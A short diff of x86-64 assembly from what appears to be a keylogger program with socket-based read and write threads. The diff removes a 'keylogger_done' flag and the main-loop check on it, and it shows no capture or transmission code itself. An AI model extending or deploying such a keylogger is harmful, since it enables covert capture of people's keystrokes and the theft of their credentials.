@@ -19,7 +19,6 @@ global write_pos
 global read_pos
 global buffer 
 global socket_connected
-global keylogger_done 
 global socket_done 
 extern write_thread 
 extern read_thread
@@ -28,7 +27,6 @@ extern read_thread
 section .bss
 
   socket_connected resb 1
-  keylogger_done resb 1
   socket_done resb 1
 
   write_pos resq 1
@@ -58,7 +56,6 @@ init:
   mov qword [write_pos], 0
   mov qword [read_pos], 0
   mov byte [socket_connected], 0 
-  mov byte [keylogger_done], 0 
   mov byte [socket_done], 0 
   ret
 
@@ -79,8 +76,6 @@ thread_start:
 
 ; Keep main thread alive indefinitely
 main_loop:
-  cmp byte [keylogger_done], 1
-  je cleanup 
   cmp byte [socket_done], 1
   je cleanup 
   jmp main_loop
